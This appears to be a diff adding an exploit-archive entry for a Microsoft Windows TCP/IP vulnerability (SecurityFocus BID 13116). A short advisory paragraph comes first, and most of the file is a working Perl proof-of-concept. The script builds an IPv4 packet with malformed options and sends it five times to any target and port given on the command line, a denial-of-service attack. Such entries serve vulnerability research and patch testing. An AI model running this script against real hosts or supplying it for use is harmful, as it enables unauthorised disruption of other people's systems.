@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/13116/info
+
+Microsoft Windows is reported prone to a remote code execution vulnerability. It is reported that the vulnerability manifests when an affected Microsoft platform receives and processes an especially malformed TCP/IP packet.
+
+Reports indicate that the immediate consequences of exploitation of this issue are a denial of service. 
+
+#!/usr/bin/perl
+use strict;
+use warnings;
+
+my %opts;
+use Getopt::Std;
+getopts('t:p:', \%opts);
+die("Usage: $0 -t TARGET -p PORT\n") unless $opts{t} && $opts{p};
+
+use Net::Pkt;
+
+$Env->debug(3);
+
+my $frame = Net::Packet::Frame->new(
+   l3 => Net::Packet::IPv4->new(
+      dst     => $opts{t},
+      options => "\x03\x27". 'G'x38,
+   ),
+   l4 => Net::Packet::TCP->new(
+      dst => $opts{p},
+   ),
+);
+
+$frame->send for 1..5;
